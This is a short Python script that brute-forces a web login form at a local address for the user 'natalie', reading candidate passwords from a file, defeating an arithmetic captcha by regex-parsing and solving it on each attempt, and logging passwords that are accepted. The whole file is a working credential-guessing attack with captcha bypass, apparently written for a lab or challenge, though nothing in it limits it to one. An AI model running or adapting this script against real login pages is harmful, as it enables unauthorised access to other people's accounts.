import re
import requests
import time

url = "http://192.168.1.1/login" #target URL
file_path = "" #path to passwords.txt

payload_template = {
    "username": "natalie",
    "password": "",
    "captcha": ""
}

def solve_captcha(num1, num2, operator):
    if operator == '+':
        return num1 + num2
    elif operator == '-':
        return num1 - num2
    elif operator == '*':
        return num1 * num2
    elif operator == '/':
        return num1 / num2

def main():
    with open(file_path, 'r') as file:
        for idx, password in enumerate(file, start=1):
            password = password.strip()

            response1 = requests.post(url, data=payload_template)
            captcha = re.search(r'(\d+)\s*([+\-*/])\s*(\d+)', response1.text)

            if captcha:
                num1, operator, num2 = captcha.groups()

                print(f"Processing password: {password}")
                print(f"Attempt: {idx}")
                print(f"Captcha: {num1} {operator} {num2}")

                try:
                    result = solve_captcha(int(num1), int(num2), operator)
                    print(f"Solved Captcha: {result}")

                    payload_template["password"] = password
                    payload_template["captcha"] = str(result)

                    response2 = requests.post(url, data=payload_template)

                    if "Invalid captcha" not in response2.text:
                        if "Invalid password for user" not in response2.text:
                            with open("exist.log", "a") as exist_file:
                                exist_file.write(password + "\n")
                            print("Captcha solved correctly. User exists.")
                        else:
                            print("Captcha solved correctly. User does not exist or password is incorrect.")
                    else:
                        print("Error: Invalid captcha")

                    time.sleep(0.2)

                except ValueError:
                    print("Error: Invalid captcha")

            else:
                print("Error: Failed to retrieve captcha")

if __name__ == "__main__":
    main()
